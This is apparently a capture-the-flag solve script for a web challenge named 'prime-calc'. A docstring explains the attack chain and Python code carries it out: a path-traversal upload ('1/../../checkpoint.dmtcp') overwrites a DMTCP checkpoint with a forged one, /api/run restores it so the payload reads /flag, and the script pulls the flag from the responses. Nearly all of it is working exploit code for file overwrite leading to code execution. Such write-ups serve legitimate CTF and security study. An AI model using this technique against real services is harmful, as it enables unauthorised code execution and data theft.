#!/usr/bin/env python3
"""
Exploit for prime-calc (K17{...}).

Chain:
  1. /api/config path traversal: `timestamp="1/../../checkpoint.dmtcp"` makes the
     uploaded file save to /app/data/checkpoint.dmtcp (still under BASE_DIR, so the
     check passes). The file is written BEFORE JSON validation, so the 400 response
     doesn't undo the overwrite.
  2. We overwrite the DMTCP checkpoint with our own forged checkpoint (built in a
     matching python:3.13-slim + DMTCP 4.2.0 image). It is a C program that reads
     the group-readable /flag and writes it to /app/data/output/latest.txt.
  3. /api/run -> worker.cycle() -> dmtcp_restart <our checkpoint> -> payload runs as
     user `prime` -> flag written to latest.txt.
  4. Read it back from the /api/run response (or /api/status).

Usage: python solve_primecalc.py http://HOST:PORT
"""
import re
import sys
import requests

CKPT = "checkpoint.dmtcp"


def main():
    if len(sys.argv) != 2:
        print("usage: python solve_primecalc.py <base_url>")
        sys.exit(1)
    base = sys.argv[1].rstrip("/")

    with open(CKPT, "rb") as f:
        ckpt = f.read()
    print(f"[*] forged checkpoint: {len(ckpt)} bytes")

    # 1) overwrite /app/data/checkpoint.dmtcp via path traversal
    r = requests.post(
        f"{base}/api/config",
        data={"timestamp": "1/../../checkpoint.dmtcp"},
        files={"config": ("x.dmtcp", ckpt, "application/octet-stream")},
        timeout=30,
    )
    print(f"[*] upload -> {r.status_code} {r.text[:200]}")
    # 400 "invalid config contents" is EXPECTED (binary isn't JSON) but file is saved.

    # 2) trigger dmtcp_restart of our checkpoint
    r = requests.post(f"{base}/api/run", timeout=60)
    print(f"[*] run   -> {r.status_code}")
    try:
        j = r.json()
        blob = (j.get("output") or "") + "\n" + (j.get("status") or "") + \
               "\n" + (j.get("stdout") or "") + "\n" + (j.get("stderr") or "")
    except Exception:
        blob = r.text

    # 3) also poll status
    try:
        s = requests.get(f"{base}/api/status", timeout=30).json()
        blob += "\n" + (s.get("output") or "") + "\n" + (s.get("status") or "")
    except Exception:
        pass

    m = re.search(r"K17\{[^}]+\}", blob)
    if m:
        print("\n[+] FLAG:", m.group(0))
    else:
        print("\n[-] no flag yet. raw output tail:")
        print(blob[-1000:])


if __name__ == "__main__":
    main()
